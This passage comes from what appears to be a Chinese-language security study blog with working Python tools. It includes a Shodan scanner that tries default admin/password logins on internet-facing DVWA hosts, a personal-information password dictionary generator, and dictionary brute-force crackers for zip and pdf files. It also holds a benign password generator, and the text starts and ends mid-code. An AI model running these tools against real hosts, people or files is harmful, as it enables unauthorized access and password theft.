value=&#x27;([0-9a-z]+)&#x27;&quot;,res.text).group(1)</span><br>    token1 = re.search(<span class="hljs-string">r&quot;user_token&#x27; value=&#x27;([0-9a-z]+)&#x27;&quot;</span>,res.text)<br>    <span class="hljs-keyword">if</span> token1:<br>        token=token1.group(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        token=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># try:</span><br>    <span class="hljs-comment">#     if token1:</span><br>    <span class="hljs-comment">#         token=token1.group(1)</span><br>    <span class="hljs-comment"># except:</span><br>    <span class="hljs-comment">#     print(&quot;匹配内容为空&quot;)</span><br>    res = requests.post(<br>        <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;proto&#125;</span>://<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;ip_str&#x27;</span>]&#125;</span>:<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;port&#x27;</span>]&#125;</span>/login.php&quot;</span>,<br>        <span class="hljs-string">f&quot;username=admin&amp;password=password&amp;Login=Login&amp;user_token=<span class="hljs-subst">&#123;token&#125;</span>&quot;</span>,<br>        allow_redirects=<span class="hljs-literal">False</span>,<br>        verify=<span class="hljs-literal">False</span>,<br>        headers=&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;<br>        )<br>    <span class="hljs-comment">#登录成功会跳转到index.php</span><br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">302</span> <span class="hljs-keyword">and</span> res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>] == <span class="hljs-string">&#x27;index.php&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment">#page为Shodan.search()方法的返回值 查询结果的详情 </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_page</span>(<span class="hljs-params">page</span>):<br>    result = []<br>    <span class="hljs-keyword">for</span> instance <span class="hljs-keyword">in</span> page[<span class="hljs-string">&#x27;matches&#x27;</span>]:<br>        <span class="hljs-keyword">if</span> login_ip(instance):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+]存在默认口令：<span class="hljs-subst">&#123;instance[<span class="hljs-string">&#x27;ip_str&#x27;</span>]&#125;</span>:<span class="hljs-subst">&#123;instance[<span class="hljs-string">&#x27;port&#x27;</span>]&#125;</span>&quot;</span>)<br>            result.append(instance)<br>    <span class="hljs-keyword">return</span> result           <span class="hljs-comment">#返回存在默认用户名密码的ip列表</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_shodan</span>(<span class="hljs-params">query</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] 开始查询第一页&quot;</span>)<br>    first_page = request_shodan_api(query)  <span class="hljs-comment">#返回第一页查询结果</span><br>    total = first_page[<span class="hljs-string">&#x27;total&#x27;</span>]             <span class="hljs-comment">#数据总数</span><br>    already_processed = <span class="hljs-built_in">len</span>(first_page[<span class="hljs-string">&#x27;matches&#x27;</span>])  <br>    result = process_page(first_page)<br>    page = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> already_processed &lt; total:<br>        <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;正在查询第<span class="hljs-subst">&#123;page&#125;</span>页&quot;</span>)<br>        page = request_shodan_api(query,page=page)<br>        already_processed += <span class="hljs-built_in">len</span>(page[<span class="hljs-string">&#x27;matches&#x27;</span>])<br>        result += process_page(page)<br>        page += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> result<br><br>res = query_shodan(<span class="hljs-string">&#x27;title:dvwa&#x27;</span>)<br><span class="hljs-built_in">print</span>(res)<br><br></code></pre></td></tr></table></figure><h2 id="密码生成器"><a href="#密码生成器" class="headerlink" title="密码生成器"></a>密码生成器</h2><p>随机密码生成，例子：<a href="https://suijimimashengcheng.bmcx.com/">https://suijimimashengcheng.bmcx.com/</a></p><img src="/img/image-20230917153828063.png" alt="image-20230917153828063" style="zoom:67%;" /><h3 id="argparse模块"><a href="#argparse模块" class="headerlink" title="argparse模块"></a>argparse模块</h3><p><a href="https://zhuanlan.zhihu.com/p/539331146">python系列：argparse详解 - 知乎 (zhihu.com)</a></p><h3 id="string包含的属性"><a href="#string包含的属性" class="headerlink" title="string包含的属性"></a>string包含的属性</h3><img src="/img/image-20230917162312310.png" alt="image-20230917162312310" style="zoom: 50%;" /><img src="/img/image-20230917163807602.png" alt="image-20230917163807602" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser<br><span class="hljs-comment">#ArgumentParser解析命令行参数，并生成有用的帮助文档</span><br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> secrets      <span class="hljs-comment">#生成强随机数 </span><br><br><span class="hljs-comment">#存储生成的随机密码</span><br>passwords = []<br><br><span class="hljs-comment">#完全随机</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createRandomPWD</span>(<span class="hljs-params">args</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.amount):<br>        <span class="hljs-comment">#secrets.choice功能与random.choice(seq)相同，从指定的非空序列中随机选择一个元素并返回</span><br>        passwords.append(<span class="hljs-string">&quot;&quot;</span>.join(<br>                [secrets.choice(string.digits+string.ascii_letters+string.punctuation)\<br>                <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.total_length)]))<br><br><span class="hljs-comment">#指定参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createArgumentPWD</span>(<span class="hljs-params">args</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.amount):<br>        password = []<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.numbers):<br>            password.append(secrets.choice(string.digits))<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.uppercase):<br>            password.append(secrets.choice(string.ascii_uppercase))<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.lowercase):<br>            password.append(secrets.choice(string.ascii_lowercase))<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.special_chars):<br>            password.append(secrets.choice(string.punctuation))<br>        <span class="hljs-comment">#random.shuffle用于将一个列表中的元素打乱顺序</span><br>        random.shuffle(password)<br>        password = <span class="hljs-string">&#x27;&#x27;</span>.join(password)<br>        passwords.append(password)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setParser</span>():<br>    parser = ArgumentParser(<br>        prog = <span class="hljs-string">&quot;密码生成器&quot;</span>,<br>        description = <span class="hljs-string">&quot;r1&#x27;s 密码生成器&quot;</span><br>    )<br><br>    <span class="hljs-comment">#定义命令行参数</span><br>    parser.add_argument(<span class="hljs-string">&quot;-l&quot;</span>,<span class="hljs-string">&quot;--lowercase&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含小写字母的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-u&quot;</span>,<span class="hljs-string">&quot;--uppercase&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含大写字母的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-n&quot;</span>,<span class="hljs-string">&quot;--numbers&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含数字的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-s&quot;</span>,<span class="hljs-string">&quot;--special_chars&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含特殊字符的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-t&quot;</span>,<span class="hljs-string">&quot;--total-length&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码的总长度&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    <span class="hljs-comment">#parser.add_argument(&quot;-nu&quot;,&quot;--number&quot;,default=0,help=&quot;生成密码的数量&quot;,type=int)</span><br>    parser.add_argument(<span class="hljs-string">&quot;-a&quot;</span>,<span class="hljs-string">&quot;--amount&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;生成密码的数量&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-o&quot;</span>,<span class="hljs-string">&quot;--output_file&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出到文本文件&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><span class="hljs-comment"># print(string.digits)</span><br><span class="hljs-comment"># print(string.ascii_lowercase)</span><br><span class="hljs-comment"># print(string.ascii_uppercase)</span><br><span class="hljs-comment"># print(string.punctuation)</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">#获取参数</span><br>    args = setParser()<br>    <span class="hljs-keyword">if</span> args.total_length:<br>        <span class="hljs-comment">#指定了密码长度--完全随机</span><br>        createRandomPWD(args)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment">#未指定密码长度，自定义密码构成（数字、大小写字母、特殊字符的个数）</span><br>        createArgumentPWD(args)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>.join(passwords))<br>    <span class="hljs-comment">#写入文本</span><br>    <span class="hljs-keyword">if</span> args.output_file:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(args.output_file,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">&#x27;\n&#x27;</span>.join(passwords))<br></code></pre></td></tr></table></figure><p>待优化 </p><h2 id="社工字典生成器"><a href="#社工字典生成器" class="headerlink" title="社工字典生成器"></a>社工字典生成器</h2><p>收集个人、厂商等信息之后  社工字典就是根据这些信息组合生成密码</p><p>例如：姓名+生日    姓名+手机   身份证+昵称   等等</p><h3 id="迭代器与生成器"><a href="#迭代器与生成器" class="headerlink" title="迭代器与生成器"></a>迭代器与生成器</h3><p><a href="https://www.runoob.com/python3/python3-iterator-generator.html">Python3 迭代器与生成器 | 菜鸟教程 (runoob.com)</a></p><p><img src="/img/image-20230917175539938.png" alt="image-20230917175539938"></p><h3 id="itertools模块"><a href="#itertools模块" class="headerlink" title="itertools模块"></a>itertools模块</h3><p><a href="https://docs.python.org/zh-cn/3/library/itertools.html">itertools — 为高效循环而创建迭代器的函数 — Python 3.11.5 文档</a></p><p><img src="/img/image-20230917195100206.png" alt="image-20230917195100206"></p><p><img src="/img/image-20230917195113600.png" alt="image-20230917195113600"></p><p>实现原理（可扩充  例如位数可自行设置）：</p><p>1.信息长度大于等于8位的直接写入  </p><p>2.没到8位的拼接数字到8位  </p><p>3.两两组合做笛卡尔积  </p><p>4.前中后拼接特殊字符做笛卡尔积</p><p>个人信息示例：</p><p><img src="/img/image-20230922171702544.png" alt="image-20230922171702544"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-comment">#存放生成的密码</span><br>dictionaryFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;password.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br><br><span class="hljs-comment">#获取个人信息存到列表中</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readInformationList</span>():<br>    infoList = []<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#读取个人信息文件</span><br>        info = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;info.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        lines = info.readlines()<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>            <span class="hljs-built_in">print</span>(line.strip().split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>])<br>            infoList.append(line.strip().split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>])<br>            <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件读取错误&quot;</span>)<br>    <span class="hljs-keyword">return</span> infoList<br><br><span class="hljs-comment">#数字组合</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createNumberList</span>():<br>    numberList = []<br>    words = string.digits   <span class="hljs-comment">#0123456789</span><br>    <span class="hljs-comment">#itertools.product做笛卡尔积</span><br>    itertoolsNumberList = itertools.product(words,repeat=<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">for</span> number <span class="hljs-keyword">in</span> itertoolsNumberList:<br>        numberList.append(<span class="hljs-string">&quot;&quot;</span>.join(number))<br>    <span class="hljs-keyword">return</span> numberList<br><br><span class="hljs-comment">#特殊字符组合</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createSpecialList</span>():<br>    specialList = []<br>    specialWords = string.punctuation   <span class="hljs-comment">#!&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> specialWords:<br>        specialList.append(<span class="hljs-string">&quot;&quot;</span>.join(i))<br>    <span class="hljs-keyword">return</span> specialList<br><br><span class="hljs-comment">#混合组合</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Combination</span>():<br>    infoList = readInformationList()<br>    infoLen = <span class="hljs-built_in">len</span>(infoList)<br>    specialList = createSpecialList()   <span class="hljs-comment">#特殊字符</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(infoLen):<br>        <span class="hljs-comment">#把个人信息大于等于8位的输出到文件  因为可能直接用来当密码</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(infoList[a]) &gt;= <span class="hljs-number">8</span>:<br>            <span class="hljs-comment">#print(infoList[a])</span><br>            dictionaryFile.write(infoList[a]+<span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-comment">#不到8位的填充到8位</span><br>        <span class="hljs-keyword">else</span>:<br>            needWords = <span class="hljs-number">8</span>-<span class="hljs-built_in">len</span>(infoList[a])<br>            <br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> itertools.permutations(string.digits,needWords):<br>                <span class="hljs-comment">#print(b)</span><br>                <span class="hljs-comment">#print(infoList[a]+&quot;&quot;.join(b))</span><br>                dictionaryFile.write(infoList[a]+<span class="hljs-string">&quot;&quot;</span>.join(b)+<span class="hljs-string">&quot;\n&quot;</span>)<br>            <span class="hljs-comment">#dictionaryFile.write(infoList[a]+&quot;&quot;.join(b)+&quot;\n&quot;)</span><br>        <span class="hljs-comment">#将信息各元素两两拼接</span><br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,infoLen):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(infoList[a]+infoList[c]) &gt;= <span class="hljs-number">8</span>:<br>                <span class="hljs-comment">#print(infoList[a]+infoList[c])</span><br>                dictionaryFile.write(infoList[a]+infoList[c]+<span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-comment">#拼接特殊字符</span><br>        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,infoLen):<br>            <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(specialList)):<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(infoList[a]+specialList[e]+infoList[d]) &gt;= <span class="hljs-number">8</span>:<br>                    <span class="hljs-comment">#特殊字符加尾部</span><br>                    <span class="hljs-comment">#print(infoList[a]+infoList[d]+specialList[e])</span><br>                    dictionaryFile.write(infoList[a]+infoList[d]+specialList[e]+<span class="hljs-string">&quot;\n&quot;</span>)<br>                    <span class="hljs-comment">#特殊字符加中间</span><br>                    <span class="hljs-comment">#print(infoList[a]+specialList[e]+infoList[d])</span><br>                    dictionaryFile.write(infoList[a]+specialList[e]+infoList[d]+<span class="hljs-string">&quot;\n&quot;</span>)<br>                    <span class="hljs-comment">#特殊字符加前面</span><br>                    <span class="hljs-comment">#print(specialList[e]+infoList[a]+infoList[d])</span><br>                    dictionaryFile.write(specialList[e]+infoList[a]+infoList[d]+<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">startSocialDict</span>():<br>    Combination()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    startSocialDict()<br></code></pre></td></tr></table></figure><p>集成到密码生成器中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> social_dict  <span class="hljs-comment">#引入生成社工字典的函数</span><br><span class="hljs-comment">#添加参数</span><br>parser.add_argument(<span class="hljs-string">&quot;-so&quot;</span>,<span class="hljs-string">&quot;--social_dict&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出社工字典&quot;</span>)<br><span class="hljs-comment">#调用</span><br><span class="hljs-keyword">if</span> args.social_file:<br>   social_dict.startSocialDict()<br></code></pre></td></tr></table></figure><h2 id="zip和pdf密码破解"><a href="#zip和pdf密码破解" class="headerlink" title="zip和pdf密码破解"></a>zip和pdf密码破解</h2><p>原理：密码爆破 </p><p>使用tqdm模块（打印进度条） </p><p>zipfile模块(处理zip文件)</p><p>坑点：</p><p>[解决Python Zipfile 压缩方法无法解压密码文件_zipcrypto-CSDN博客](<a href="https://blog.csdn.net/weixin_45493551/article/details/122948775?ops_request_misc=%7B%22request_id%22:%22169512681716800182182134%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=169512681716800182182134&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122948775-null-null.142%5Ev94%5Einsert_down28v1&utm_term=%E8%A7%A3%E5%86%B3python">https://blog.csdn.net/weixin_45493551/article/details/122948775?ops_request_misc=%7B%22request%5Fid%22%3A%22169512681716800182182134%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=169512681716800182182134&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122948775-null-null.142^v94^insert_down28v1&amp;utm_term=解决python</a> zipfile 压缩方法无法解压密码文件&amp;spm&#x3D;1018.2226.3001.4187)</p><p><img src="/img/image-20230919203402127.png" alt="image-20230919203402127"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<span class="hljs-comment">#打印进度条</span><br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> pyzipper<br><br>passwordfile = <span class="hljs-string">&quot;password1.txt&quot;</span><br>zip_file = <span class="hljs-string">&quot;secret.zip&quot;</span> <br><span class="hljs-comment"># zip_file = zipfile.ZipFile(zip_file)</span><br><br>n_words = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;总密码共有: &quot;</span>,n_words)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> wordlist:<br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> tqdm(wordlist,total=n_words,unit=<span class="hljs-string">&quot;word&quot;</span>):<br>        pwd = <span class="hljs-built_in">str</span>(word,<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># zip_file.extractall(pwd=pwd)</span><br>            <span class="hljs-comment">#使用pyzipper库用密码读取zip文件</span><br>            <span class="hljs-keyword">with</span> pyzipper.AESZipFile(zip_file, <span class="hljs-string">&#x27;r&#x27;</span>, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) <span class="hljs-keyword">as</span> extracted_zip:<br>                extracted_zip.extractall(pwd=<span class="hljs-built_in">str</span>.encode(pwd))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] password found:&quot;</span>,word.decode().strip())<br>            exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] password not found,try other wordlist&quot;</span>)<br><span class="hljs-comment"># </span><br><br><span class="hljs-comment"># zip_file.extractall(pwd=&quot;123456&quot;.encode(&quot;utf-8&quot;))</span><br><span class="hljs-comment"># import pyzipper</span><br><br><span class="hljs-comment"># password = &#x27;123456&#x27;</span><br><br><span class="hljs-comment"># with pyzipper.AESZipFile(&quot;ppkke.zip&quot;, &#x27;r&#x27;, compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as extracted_zip:</span><br><span class="hljs-comment">#     extracted_zip.extractall(pwd=str.encode(password))</span><br><br></code></pre></td></tr></table></figure><p>pdf破解</p><p>依赖库：pip install pikepdf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">import</span> pikepdf<br><br>passwordfile = <span class="hljs-string">&quot;PasswordFile.txt&quot;</span><br>pdf_file = <span class="hljs-string">&quot;a.pdf&quot;</span> <br><br>n_words = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;总密码共有: &quot;</span>,n_words)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(passwordfile,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> wordlist:<br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> tqdm(wordlist,total=n_words,unit=<span class="hljs-string">&quot;word&quot;</span>):<br>        pwd = <span class="hljs-built_in">str</span>(word,<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment">#使用pikepdf库读取pdf文件</span><br>            <span class="hljs-keyword">with</span> pikepdf.<span class="hljs-built_in">open</span>(pdf_file,password=pwd) <span class="hljs-keyword">as</span> pdf:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; [+] password found:&quot;</span>+pwd)<br>                exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">except</span> pikepdf._core.PasswordError <span 